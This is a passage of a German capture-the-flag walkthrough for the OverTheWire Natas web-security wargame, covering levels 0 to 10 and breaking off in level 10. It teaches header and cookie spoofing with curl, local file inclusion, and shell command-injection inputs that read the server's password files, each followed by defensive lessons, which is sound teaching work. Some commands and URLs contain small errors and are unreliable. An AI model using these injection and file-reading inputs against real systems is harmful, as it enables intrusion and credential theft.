# Over The Wire: Natas
## Wird laufend fortgesetzt, bis das letzte Level geschafft ist.

> **ACHTUNG: SPOILER GEFAHR**

## Inhaltsverzeichnis

- [Einleitung](#einleitung)
- [Natas 0 Zugang](#natas-0-zugang)
- [Natas 1 -> 2](#natas-1---2)
- [Natas 2 -> 3](#natas-2---3)
- [Natas 3 -> 4](#natas-3---4)
- [Natas 4 -> 5](#natas-4---5)
- [Natas 5 -> 6](#natas-5---6)
- [Natas 6 -> 7](#natas-6---7)
- [Natas 7 -> 8](#natas-7---8)
- [Natas 8 -> 9](#natas-8---9)
- [Natas 9 -> 10](#natas-9---10)
- [Natas 10 -> 11](#natas-10---11)
- [Natas 11 -> 12](#natas-11---12)
- [Natas 12 -> 13](#natas-12---13)
- [Natas 13 -> 14](#natas-13---14)
- [Natas 14 -> 15](#natas-14---15)
- [Natas 15 -> 16](#natas-15---16)
- [Natas 16 -> 17](#natas-16---17)
- [Natas 17 -> 18](#natas-17---18)
- [Natas 18 -> 19](#natas-18---19)
- [Natas 19 -> 20](#natas-19---20)
- [Natas 20 -> 21](#natas-20---21)
- [Natas 21 -> 22](#natas-21---22)



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Einleitung

Einleitung zum Wargame Natas (OverTheWire)

`Natas` ist ein webbasiertes Wargame, das vom Projekt `OverTheWire.org` angeboten wird. Es richtet sich an alle, die sich mit Web-Sicherheit und Web-Hacking beschäftigen möchten.

Das Spiel besteht aus mehreren Leveln, die jeweils eine Webseite mit einer spezifischen Schwachstelle darstellen. Ziel ist es, den Zugang zum nächsten Level zu erhalten, indem du das Passwort findest, das irgendwo in der Anwendung versteckt ist - oft durch Ausnutzung klassischer Web-Sicherheitslücken.

Du lernst dabei unter anderem:
- HTML & JavaScript-Analyse
- Quelltextinspektion
- HTTP-Requests & -Headers
- Directory Traversal
- Sessions & Cookies
- SQL-Injection
- Command Injection
- und viele weitere Web-Techniken

Die Level werden schrittweise schwieriger und helfen dir dabei, ein gutes Verständnis für Web-Angriffsvektoren und deren Schutzmaßnahmen zu entwickeln.

> Der Name Natas ist "Satan" rückwärts geschrieben - ein Hinweis auf die tiefergehenden Sicherheitsaspekte, die in den Levels behandelt werden? Wer weiß!



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Natas 0 Zugang

**Aufgabe:** Erhalte Zugang zur Challenge

```text
Username:   natas0

Password:   natas0

URL:        http://natas0.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Gib die URL in deinem Browser ein. Melde dich mit dem Username `natas0` und dem Passwort `natas0` auf der Webapplikation an.
Sobald du eingeloggt bist, erscheint die Webseite und die erste Challenge beginnt. 

Finde das Passwort für das nächste Level `natas1`.

Öffne den Inspector und inspiziere die Webseite. Drücke entweder die `rechte Maustaste` und wähle `untersuchen` aus oder drücke auf der Tastatur `Strg` + `Umschalt` + `c` auf Windows und Linux/Mac `Cmd` + `Umschalt` + `c`.

![Natas1 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas1.png)

Du solltest das Passwort innerhalb des HTML-Codes sehen. Aus sicherheitstechnischer Sicht ein kompletter fail! Solche sensiblen Informationen gehören nicht in Codes, die von der Öffentlichkeit eingesehen werden können. 

Kopiere das Passwort und fahre mit der nächsten Challenge fort.

### Erkenntnisse - HTML-Quellcode Analyse

- **Informationslecks im Client-Code:** Das Passwort ist direkt im HTML-Quellcode der Seite eingebettet.

- **Basis-Analyse-Tool:** Die Browser-Entwickler-Tools (Inspector) sind das primäre Werkzeug zur Untersuchung von Web-Anwendungen.

</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 1 -> 2

**Aufgabe:** Finde das Passwort.

```text
Username:   natas1

URL:        http://natas1.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

In diesem Level ist es nicht möglich, das Kontextmenü per rechter Maustaste zu öffnen. Allerdings kennst du bereits ein Shortcut. Verwende ihn und untersuche die Webseite.

Hier noch einmal der Shortcut: `Strg` + `Umschalt` + `C` auf Windows oder `CMD` + `Umschalt` + `C` auf macOS.

![Natas2 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas2.png)


### Erkenntnisse - Client-seitiger Schutz-Bypass

- **Client-Side Security ist Illusion:** Das Deaktivieren der rechten Maustaste (Kontextmenü) bietet keinerlei echten Schutz.

- **Hardcore-Bypass:** Client-seitige Einschränkungen können immer durch direkte Tastenkürzel (`Strg`+`Umschalt`+`C`) oder den direkten Zugriff auf den Quellcode umgangen werden.


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 2 -> 3

**Aufgabe:** Finde das Passwort.

```text
Username:   natas2

URL:        http://natas2.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Das erste, was du siehst, ist der Satz: `There is nothing on this page`.
Wenn also das Passwort nicht auf dieser Seite zu finden ist, gibt es vielleicht eine weitere Seite oder eine Datei. 

Inspiziere den HTML-Code. Es gibt eine interessante Sache.

![Natas3 Source Code inspizieren](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas3.png)

```html
<img src="files/pixel.png">
```

Interessant ist vor allem eine Sache: `files/". Das lässt daraufschließen, dass es ein Verzeichnis gibt, in dem dieses Bild zu finden ist. Vielleicht auch mehr?

Um das herauszufinden, gib folgendes in die URL-Zeile deines Browsers ein:

```http
http://natas2.natas.labs.overthewire.org/files
```

![Natas3 neue URL untersuchen](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas3b.png)

Sieh an! Neben dem Bild, welches sich im Source Code befindet, gibt es eine Datei mit der Bezeichung `Users.txt`.
Klick auf die Datei, um das Passwort zu erhalten.

![Natas3 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas3c.png)


### Erkenntnisse - Directory Traversal und Verzeichnis-Enumeration

- **Hinweise im Code:** Der HTML-Code enthält oft versteckte Hinweise auf Verzeichnisstrukturen (z.B. `<img src="files/...")`).

- **Directory Traversal:** Die Navigation zu bekannten oder aus dem Code abgeleiteten Verzeichnissen (`/files/`) kann zur Offenlegung sensibler Dateien (`Users.txt`) führen.


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 3 -> 4


**Aufgabe:** Finde das Passwort.

```text
Username:   natas3

URL:        http://natas3.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Nach dem du dich eingeloggt hast, sieht du das gleiche wie das Level zuvor:
`There is nothing on this page`

Du kannst den Source Code analyisieren, doch das ist nur Zeitverschwendung.

Es gibt eine Alternative, die es uns ermöglicht, die Konfigurationen einer Webseite bzw. eines Webservers anzusehen.

Bei dieser Alternative handelt es sich um die `robots.txt`-Datei - eine Textdatei, die Webseitenbetreiber konfigurieren, wenn sie nicht wollen, dass ihre Webseite(n) indexiert werden sollen. Webcrawler erhalten von dieser Datei ihre Anweisungen, damit sie wissen, wie sie mit den Inhalten umzugehen haben.

Es kann zum Beispiel dafür genutzt werden, dass sensible Bereiche einer Webseite wie es der `admin`-Bereich ist, nicht auf Google oder sonstigen Suchmaschinen anzeigen zu lassen.

Gib im Browser die folgende URL ein:
```http
http://natas3.natas.labs.overthewire.org/robots.txt
```

![Natas4 robots.txt Information](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas4.png)

In der `robots.txt` ist zu sehen, dass der Webseitenbetreiber nicht möchte, dass das Verzeichnis `/s3cr3t/` von einem Webcrawler indexiert wird.

Verändere deine URL so, dass du zu diesem Verzeichnis navigierst.

```http
http://natas3.natas.labs.overthewire.org/s3cr3t/
```
![Natas4 /file Zugang](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas4b.png)

Schon wieder eine `user.txt`-Datei. Klick sie an und erhalte das Passwort für das nächste Level.

![Natas4 Password](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas4c.png)


### Erkenntnisse - robots.txt als Informationsquelle

- **Überprüfung von Standard-Dateien:** Entwickler vergessen oft, dass `robots.txt` für jeden zugänglich ist und nicht nur für Webcrawler.

- **Verstecken durch Ausschluss:** Die Datei wird zur Offenlegung sensibler Verzeichnisse (`/s3cr3t/`) missbraucht, die eigentlich vor Suchmaschinen versteckt werden sollten.


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 4 -> 5

**Aufgabe:** Finde das Passwort.

```text
Username:   natas4

URL:        http://natas4.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Gib im Browser deiner Wahl die URL für dieses Level ein und bestätige mit der `Enter`-Taste.
Melde dich mit `natas4` und dem Passwort aus dem zuvorherigen Level an.

Wenn du eingeloggt bist, siehst du eine Nachricht, die so viel sagt wie, dass du nicht berechtigt bist, über den `Referer` auf die Seite zu kommen.

Das einfachste, was du versuchen kannst, ist es, den Request-Header so zu modifizieren, dass du einer `GET`-Methode einen weiteren Parameter hinzufügst und probierst, ob es funktioniert. In diesem Fall benötigst du den `Referer`-Header, damit du der Hauptseite von `natas4` eine Umleitung von `natas5` suggerieren kannst.

- **Analysiere die Header der Webseite**

Inspiziere die Webseite und klicke auf den Reiter `Network`. Es wird vermutlich so sein, dass du auf `Reload` klicken musst, damit die Aufzeichnung neu geladen wird.

**Achtung:** Browser erlauben in der Regel keine Manipulation von sicherheitsrelevanten Headern wie Referer in JavaScript-Code aus Sicherheitsgründen. Dies funktioniert oft nur mit Proxies oder `curl`. Die folgende Darstellung zeigt, wie der korrekte `fetch`-Befehl technisch aussehen müsste, um die Header zu senden.

Anschließend erhältst du die Webseiten, die mit dem Webserver kommunizieren. Klicke auf die Datei, die den Source Code für die Webseite beinhaltet. Das sollte die Aufzeichnung sein, die in ein der Spalten als `document` oder als `html` gekennzeichnet ist.


> Wenn du mehr über das Thema `Header` im HTML-Request erfahren willst, kannst du bei den [Mozilla Developer Dokumentation für Header](https://developer.mozilla.org/de/docs/Web/API/Headers) vorbeischauen.


![Natas5 Header inspizieren](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas5.png)

Sobald du auf die Aufzeichnung klickst, tauchen rechts weitere Informationen dazu auf. Die gesamte HTTP-Anfrage um genau zu sein. Sie besteht aus der Methode (hier `GET`) und dem `Response` sowie `Request` Reitern. Response ist die Antwort vom Server mit seinen Header-Informationen. Der Request wird seitens des Browsers, also des Clients gesendet.   
Es gibt zwei Möglichkeiten für dich nun vorzugehen.

Drücke im `Request Headers` auf den Button `Raw` und für die Rohfassung. Das hat den Vorteil, dass du die Daten einfach markieren und kopieren kannst. Die kannst du dann im Reiter `Console` mit der in `JavaScript` vorhandenen WebAPI `fetch` verwenden, die die Daten einer Webseite `fetchen` also anfordern kann. 

Jetzt ist gerade die Verwirrung groß. JA, du holst Daten mit `fetch`, doch du kannst auch welche senden.

Falls du den Header über die `fetch`-API nutzen willst, kopiere sicherheitshalber den `Authorization`-Header, die dein Username und Passwort beinhaltet. Danach klickst du auf den Reiter `Console`, und gibst folgenden Befehl ein:

```JavaScript
fetch("http://natas4.natas.labs.overthewire.org", {
    method: "GET" // optional, da bei fetch() GET standard
    headers: 
    {
        // 'Host' und 'Authorization' werden meist vom Browser/fetch korrekt gesetzt
        // Hier nur das Wichtige: Referer fälschen
        'Referer': 'http://natas5.natas.labs.overthewire.org'
        // Den kopierten Authorization Header einfügen, falls fetch ihn nicht automatisch setzt:
        'Authorization': 'Basic deinKey' // <- Dein Authorization Header
    }
})
.then(response => response.text())  // Antwort als Text verarbeiten
.then(text => console.log(text))        // Text (HTML-Seite) in der Konsole ausgeben
.catch(error => console.error('Fehler beim Fetch:', error)); // Fehlerbehandlung
```

**Erklärung:**
- `fetch()`: moderner als `XMLHttpRequest`, sendet und verarbeitet HTTP Anfragen
- `method`: `GET` als Methode (bei `fetch()` im Standard) für HTTP-Anfrage
- `headers`:
- `.then(response => response.text())`: Dann die Ausgabe in eine Text-Datei speichern und
- `.then(console.log(response))`: die Datei in der Console ausgeben.
- `.catch(error => console.error...)`: Gibt eine Fehlermeldung aus, wenn die Eingabe nicht übermittelt werden kann.

Mehr zur `WebAPI - fetch()` erhältst du hier: [Mozilla Developer - Verwendung der fetch API](https://developer.mozilla.org/de/docs/Web/API/Fetch_API/Using_Fetch).


### **Oder**

Wenn die Methode oben nicht funktioniert, dann liegt das vermutlich daran, dass der Browser die Daten beim Senden überschreibt und sie somit wieder wahrheitsgemäß an den Server übermittelt.

Eine weitere Alternative, wie du an das Passwort kommen kannst ist mit dem `curl`-Befehl. `curl` ist ein Programm, mit dem HTTP(S)-Request gesendet werden können. Ein sehr mächtiges Werkzeug.

Öffne deine Konsole und gib folgenden Befehl ein:
```bash
curl -u natas4:deinPasswort -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
```

**Erklärung:**
- `-u <user:password>`: kurzform für `--user`, Basic HTTP Authentication mit Benutzername und Passwort.
    - Das ist der Parameter im fetch()-Code: `Authentication: Basic [Base64-Passwort]`.
- `-H "<Headername>: <Wert>"`: kurz für `--header ...`, fügt HTTP-Request einen Header hinzu.
- `http://natas4.natas.labs.overthewire.org`: Ziel-URL


![Natas5 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas5c.png)


### Erkenntnisse - HTTP-Header-Manipulation (Referer)

- **Header-Abhängigkeit / Referer Header Schutz:** Manche Webanwendungen verwenden den HTTP Referer Header als einfache Zugriffskontrolle, um sicherzustellen, dass Anfragen nur von einer erwarteten Quelle (Domain) stammen. Dies soll beispielsweise Cross−Site Request Forgeries (CSRF) oder Hotlinking verhindern.

- **Fälschen des Ursprungs:** Der Referer Header ist Client-steuerbar. Da es sich lediglich um einen Textwert handelt, der vom Client (Browser, `curl`) an den Server gesendet wird, kann dieser leicht gefälscht (spoofed) werden.

- **Sicherere Kontrollen:** Diese Art der Zugriffskontrolle ist leicht zu umgehen und gilt als unsicher. Eine robustere Authentifizierung und Autorisierung sollte auf Sessions, Tokens oder richtigen ACLs (Access Control Lists) basieren.

</details>





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Natas 5 -> 6

**Aufgabe:** Finde das Passwort.

```text
Username:   natas5

URL:        http://natas5.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Beim Einloggen auf die Webseite erhältst du die Nachricht `Access disallowed. You are not logged in`.
Das kann darauf schließen, dass in unserem Header ein Cookie gesetzt sein könnte. Das kannst du folgendermaßen überprüfen:

Begib dich direkt in den `DevTools` deines Browser zum Reiter `Network`. Lade, sofern nötig die `Network`-Daten neu mit `reload` (Firefox).

Beim Analysieren des Headers der Challenge-Webseite sollte dir ein `Response`-Parameter im Header besonders ins Auge fallen: `Set-Cookie: loggedin=0`.

![Natas6 Header analysieren](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas6.png)

Mit dieser Information kannst du versuchen, den Header so zu manipulieren, dass du dem Server suggerierst, eingeloggt zu sein.

Öffne dein Terminal und gib folgenden Befehl ein:
```bash
curl -u natas5:deinNatasPassword -H "Cookie: loggedin=1" http://natas5.natas.labs.overthewire.org
```

Und siehe da, du hast das Passwort im Terminal erhalten.

![Natas6 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas6b.png)


### Erkenntnisse - HTTP-Cookie-Manipulation

- **Zustand im Cookie:** Die Login-Information wird in einem einfach manipulierbaren Cookie (`loggedin=0`) auf Client-Seite gespeichert.

- **Erhöhen der Rechte:** Durch Ändern des Cookie-Werts (`loggedin=1`) per `curl -H "Cookie:..."` kann der Zugriff auf die geschützte Ressource erlangt werden.


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 6 -> 7

**Aufgabe:** Finde das Passwort.

```text
Username:   natas6

URL:        http://natas6.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Gleich zu Beginn der Challenge wirst du aufgefordert, etwas einzugeben.
Du hast nur den Begriff `Input secret` stehen und ein Eingabefeld.

Klicke jedoch auf den Link `View sourcecode`.

Du kommst dann auf den Sourcecode der Seite, die die `POST`-Methode und die Daten aus dem Eingabefeld verarbeitet.

Schau dir den Code an. Fällt dir etwas auf?

![Natas7 Sourcecode analysieren](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas7.png)

Im PHP-Code findest du die Zeile `include "includes/sercret.inc"` ganz zu Beginn des Codes. Daras kannst du schließen, dass es eine Datei (`secret.inc`) in einem Verzeichnis (`include/`) liegt, von der du im Frontend nichts mitbekommen hast. Finde heraus, ob die Datei tatsächlich mit dem Dateiverzeichnis des Servers übereinstimmt (vielleicht könnte sie dich auch weiterleiten) und existiert. Sollte das der Fall sein, dann wirst du irgendwo einen weiteren Anhaltspunkt oder sogar das Passwort finden.  

Gib folgendes nun in die Browser URL ein:
```http
http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

Falls du eine leere Seite angezeigt bekommst, bist du schon mal richtig. Inspiziere die Seite und du erhältst den richtigen Inhalt der `$secret`-Variable für das Eingabefeld auf der "Hauptseite".

Kopiere den Schlüssel ohne die Anführungsstriche. Du musst vermutlich einen Doppelklick auf den Wert der Variable machen. Begib dich anschließend wieder auf die "Hauptseite" zurück, wo du dann den `Secret-Key` über `POST` an den Server übermittelst.

![Natas7 Secret Key](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas7b.png)

Nachdem du diesen versteckten Inhalt per `Submit Query` übermittelt hast, solltest du das Passwort für die nächste Challenge erhalten.

![Natas7 Secret Key](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas7c.png)


### Erkenntnisse - File Inclusion (Lokale Datei-Inklusion)

- **Code-Analyse ist Pflicht:** Die Überprüfung des Sourcecodes ist unerlässlich, um versteckte include-Befehle (`include "includes/secret.inc"`) zu finden.

- **Exposed Assets:** Die inkludierte Datei (`secret.inc`) ist direkt über die URL aufrufbar und enthält den benötigten geheimen Schlüssel ($secret).


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 7 -> 8

Username:   natas7

URL:        http://natas7.natas.labs.overthewire.org

**Aufgabe:** Finde das Passwort.

<details>
    <summary>Lösung</summary>

Diesmal gibt es ein kleines Navigationsmenü, wie du es bspw. von gewöhnlichen Webseiten gewöhnt bist.
Wenn du beide Links klickst, dann wirst du nicht viel im Frontend zu sehen bekommen.

Inspiziere den Code auf der `Home`-Seite und schau dir an, was du finden kannst:

![Natas8 Code inspizieren](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas8.png)

Im Code findest du einen Hinweis darauf, wo das Passwort für `natas8` zu finden ist. Die Frage ist nur, was du mit dieser Information unternehmen kannst?

Wenn du auf einen der Links auf der Homepage (`home` / `about`) nicht geklickt hast, dann solltest du die Seite einmal über einen dieser Links laden und beobachten, wie die URL sich verändert.

Deine URL sollte ungefähr so aussehen `....org/index.php?page=home`. Da du nicht nur die Home, sondern auch die About-Seite hast, steht in der URL nun ein `?page=`. 

Es sagt also folgendes im URL Browser:

> "Ich habe eine Variable nach `index.php` gestellt, aber ich weiß nicht, welcher Wert als nächstes kommt. Dazu warte ich einfach ab, was mein User mir mitteilt und übergebe ihn dir anschließend. Warte du bis dahin."

Um es einfach auszudrücken :).

Versuche nun mit dem Tipp der Homepage, ob du an das Passwort kommst.

Gib im Browser folgende URL ein und du solltest das Passwort erhalten:

```http
http://natas7.natas.labs.overthewire.org/index.php?etc/natas_pass/natas8
```

![Natas8 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas8b.png)


### Erkenntnisse - Local File Inclusion (LFI) via URL-Parameter

- **LFI-Muster in URLs:** URLs, die Dateinamen oder Pfade als Parameter verwenden (`?page=home`), sind anfällig für Local File Inclusion (`LFI`).

- **Pfad-Traversal zum Passwort:** Durch das Einfügen eines absoluten Pfads (`/etc/natas_pass/natas8`) in den page-Parameter kann der Server dazu gebracht werden, lokale Systemdateien anzuzeigen.


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 8 -> 9

**Aufgabe:** Finde das Passwort.

```text
Username:   natas8

URL:        http://natas8.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Dieses Level lässt tatsächlich nicht zu, dass du dich über den Browser einloggst. Du wirst ständig aufgefordert, die Benutzerdaten des Users `natas8` einzugeben.

Auch das Analysieren der Internetseite bringt dir in diesem Level nichts, da du keinen Zugriff auf die HTML-Datei über den Server erhältst.

Versuche es über das Terminal mit dem `curl`-Befehl.

Öffne dein Terminal und gib folgenden Befehl ein:
```bash
curl -u natas8:password http://natas8.natas.labs.overthewire.org
``` 

Damit solltest du wenigstens sehen, wie die Seite aufgebaut ist.
Und tatsächlich war es ein Erfolg, da der Benutzername und das Passwort in erster Linie stimmen und nur der Browser die Daten nicht übermitteln wollte.

![Natas9 curl für mehr Infos zur Webseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas9.png)

Im roten Rechteck ist die Nummer `1` und die `2` zu sehen. `1` zeigt dir, dass die Internetseite ein Formular hat, welches Daten übermittelt.


Auch siehst du bei `2`, dass ein Link zu einem Sourcecode führt mit der Verlinkung `index-source.html`. Allerdings wird es so sein, dass du beim `curl` dieser Seite vermutlich ohne weitere Programme, den Sourcecode aufgrund von `HTTP-Entities` wie `&nbsp`, `&lt;`, `&gt;`, `&#x27;` etc.  nicht so einfach lesen kannst.

Was du stattdessen machen kannst, ist es, die `index-source.html` in eine Datei zu laden und die Datei zu öffnen. Wenn du die Datei mit der Endung `.html` versiehst, dann wird dein Browser diese Datei öffnen.

Gib im Terminal folgenden Befehl ein:
```bash
curl -u natas8:passwort -o html.html http://natas8.natas.labs.overthewire.org/index-source.html
``` 

![Natas9 Webseite in eigene Datei speichern](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas9b.png)


Falls du keinen Pfad angegeben hast, schau unter Linux in deinem `home`-Verzeichnis nach. Da bewegst du dich als User standardmäßig, wenn du das Terminal öffnest und eine Shell-Session startest.

Wenn du die `index-source.html` erfolgreich in `html.html` heruntergeladen hast, kannst du die Datei per Doppeklick oder über den Terminal-Befehl öffnen:

```bash
firefox html.html # startet die Datei in Firefox (ich nutze Firefox hier)
```

In der Variable `$encodedSecret = ...` findest du dann das Passwort für die nächste Challenge. Allerdings musst du dieses Passwort entschlüsseln. Jedoch hast du dafür bereits einen weiteren Tipp im Source Code:

![Natas9 Passwort entschlüsseln](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas9c.png)

Ich gehe kurz auf die Funktion ein:

```php
$encodedSecret = "Passwort...";                     // Variable mit dem Passwort
function encodeSecret($secret) {                    // function mit Parameter ($secret)
    return bin2hex(strrev(base64_encode($secret)))  // Zuückgeben von Passwort
}
```
Ausschlaggebend ist, wie das Passwort mit dieser Funktion verschlüsselt wird. Also solltest du das gleiche tun.

Kopiere den Wert der Variable `$encodedSecret` und gib im Terminal folgenden Befehle ein:

```bash
echo "3d3d516343746d4d6d66c315669563362" | xxd -r -p   
# du solltest dann sowas erhalten:      ==QcCtmMml1ViV3b
echo "==QcCtmMml1ViV3b" | rev
# du solltest dann sowas erhalten:      b4ViV1lmMmtCcQ==
echo "b4ViV1lmMmtCcQ==" | base64 -d
# du solltest dann sowas erhalten:      oubWYf2kBq
```

![Natas9 Passwort entschlüsseln](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas9d.png)

Nun Kopiere das Passwort `oubWYf2kBq`, damit du es auf der Hauptseite in das Eingabfeld einfügen kannst. Submitte es und erhalte das Passwort für die nächste Challange.

![Natas9 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas9e.png)


### Erkenntnisse - Multi-Layer-Kodierung und Terminal-Tools

- **Authentifizierung via cURL:** Wenn der Browser Probleme mit der HTTP-Basic-Authentifizierung hat, ist `curl -u` das zuverlässigere Werkzeug.

- **Reverse-Engineering der Kodierung:** Das Passwort ist mehrfach kodiert (Base64 → Reverse → Hex). Der PHP-Sourcecode liefert die exakte Reihenfolge der Verschlüsselungsfunktionen (`bin2hex(strrev(base64_encode(...)))`), die für die Entschlüsselung umgekehrt werden muss.

- **Unix-Werkzeuge:** Tools wie `xxd -r -p` (Hex-Dekodierung), `rev` (String-Reverse) und `base64 -d` (Base64-Dekodierung) sind für das Reverse-Engineering im Terminal essenziell.


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 9 -> 10

**Aufgabe:** Finde das Passwort.

```text
Username:   natas9

URL:        http://natas9.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>

Nach dem Login, kannst du direkt den `Sourcecode` anschauen.

![Natas10 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas10.png)

Es handelt sich dabei um die `php`-Syntax. Das siehst du daran, dass der Code mit`<?` eingeleitet und `?>` beendet wird.

Die Variable `$key` speichert die Eingabe des Users. Die Variable hat standardmäßig keinen Wert, was du daran erkennen kannst, dass sie zwei `"` hat.

```php
if(array_key_exists("needle", $_REQUEST)){      // überprüft Superglobal-Array $_REQUEST
    $key = $_REQUEST["needle"]                  // Wert wird in Variable $key gespeichert
    }
```

![Natas10 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas10b.png)


Die **erste** `if`-Kondition `array_key_exists("needle", $_REQUEST)` überprüft, ob der Parameter `$_REQUEST` im `Superglobal-Array` (php), also die Daten im GET, POST und der COOKIEs, richtig enthalten sind. 

Wenn du bspw. das Suchwort `test` in das Eingabefeld der Seite eingibst, dann erhält dein Browser folgendes hinzu:

```http
http://natas9.natas.labs.overthewire.org/?needle=test...
```

Somit bekommt `$_REQUEST['needle']` den Wert `test`.

Falls du dich fragst, was `needle` bedeutet: Das ist nur der Name des `input`-Feldes, der über `php` im Backend ausgelesen wird.

In der **zweiten** `if`-Kondition kannst du sehen, dass der Code nicht "sanitisiert" wird. 

```php
passthru("grep -i $key dictionary.txt");
```

Das bedeutet, dass der Code ohne Maskierung oder Prüfung an ein Shell-Kommando übergeben werden kann. Ein Angreifer kann also beliebige Shell-Befehle ausführen.

Wie kannst du das für dich nutzen?

Du musst diesen Code "escapen" indem du ein `;` eingibst und anschließend deine Terminal-Befehle.

Stell dir das mit dem `passthru()`-Code so vor:   
Angenommen unsere Eingabe lautet "test"   
Dann kannst du davon ausgehen, dass der Code folgendermaßen übergeben wird:

```php
passthru("grep -i test dictionary.txt"); // Funktion würde nun nach test in der dictionary.txt suchen und dir alles ausgeben.
```

Stattdessen kannst du mit der `Command Injection` aus diesem Befehl ausbrechen (wie bei einer SQL-Injection) und kannst weitere Befehle eingeben.
Die Funktion `passthru()` funktioniert weiterhin, nur ist sie modifiziert. Der Befehl `grep` wird trotzdem ausgeführt, hat hier aber keine Bedeutung mehr, da mit `;` der Code an nach `test` beendet wurde, um einen neuen Teil einzuleiten.

**Tipp**

Die Command Injection könntest du sicherer gestalten, wenn du die `$key`-Variable validierst mit [escapeshellarg($key)](https://www.php.net/manual/de/function.escapeshellarg.php).

Und in diesem Teil kannst du deine `Command Injection` einfügen.

Gib in der Suchleiste also folgendes ein:

```bash
; ls /etc/
```

Dieser Befehl sollte dir das `/etc/`-Verzeichnis auflisten.

![Natas10 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas10c.png)

Nun weißt du, dass durch die Fehlverarbeitung des Codes (ohne Prüfung auf Command Injections) Befehle eingegeben werden können, die auf dem Server verarbeitet werden.

Drücke `Strg` + `F` (Windows) bzw `Cmd` + `F` (Mac/Linux) und suche nach `natas`. Das sollte dir die vorhandenen Verzeichnisse auflisten, die in deren Bezeichnung "natas" vorkommt.

![Natas10 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas10d.png)

Du kannst mit `; ls /etc/XY` dich durch die Verzeichnisse probieren, aber der richtige Befehl ist:

```bash
; ls /etc/natas_webpass/natas10
```

Damit solltest du das Passwort für die nächste Challenge erhalten.

![Natas10 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas10e.png)


### Erkenntnisse - Command Injection (Fehlende Sanitization)

- **Gefährliche PHP-Funktionen:** Die Funktion `passthru()` übergibt Benutzereingaben direkt an die Shell, was ohne Prüfung zur **Remote Code Execution** (**RCE**) führt.

- **Aus dem Befehl ausbrechen:** Mit dem Trennzeichen Semikolon (`;`) kann der ursprüngliche Befehl beendet und ein neuer, beliebiger Shell-Befehl eingeschleust werden (z.B. `test; ls /etc/`).

- **Ausnutzung des grep Verhaltens:** Der Angriff basiert auf der fehlenden Validierung des $key-Werts.


</details>




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Natas 10 -> 11

**Aufgabe:** Finde das Passwort.

```text
Username:   natas10

URL:        http://natas10.natas.labs.overthewire.org
```


<details>
    <summary>Lösung</summary>

Selbes Spiel, wie das Level zuvor.

Wenn du diesmal den Sourcode betrachtest, dann erkennst du, dass eine Validierung vorgenommen wird.

Es wird diesmal überprüft, ob illegale Zeichen verwendet werden:

![Natas11 Password](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas11.png)

Das bedeutet, dass du keines dieser Zeichen `;`, `|` und `&` im Eingabefeld verwendet kannst, weil es im Backend überprüft wird.

Es gibt jedoch die Möglichkeit mit `$` den Code zu "escapen". Du könntest beispielweise `$(ls)` verwenden, um die `index-source.html` auszugeben.

![Natas11 Password](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas11b.png)

Allerdings scheint es so, dass der Befehl `$(cat /etc/natas_webpass/natas11)` nicht ausgeführt wird. 

Dazu musst du wissen, was `passthru("grep -i $key dictionary.txt") macht.

